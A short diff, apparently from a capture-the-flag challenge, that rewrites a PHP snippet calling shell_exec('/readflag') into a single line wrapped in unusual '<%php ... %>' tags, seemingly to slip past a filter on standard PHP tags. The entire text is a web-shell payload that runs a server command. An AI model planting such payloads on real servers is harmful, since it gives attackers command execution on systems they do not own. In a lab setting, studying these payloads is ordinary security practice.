@@ -1,3 +1,1 @@
-<?php
-echo shell_exec('/readflag');
-?>
+<%php echo shell_exec('/readflag'); %>
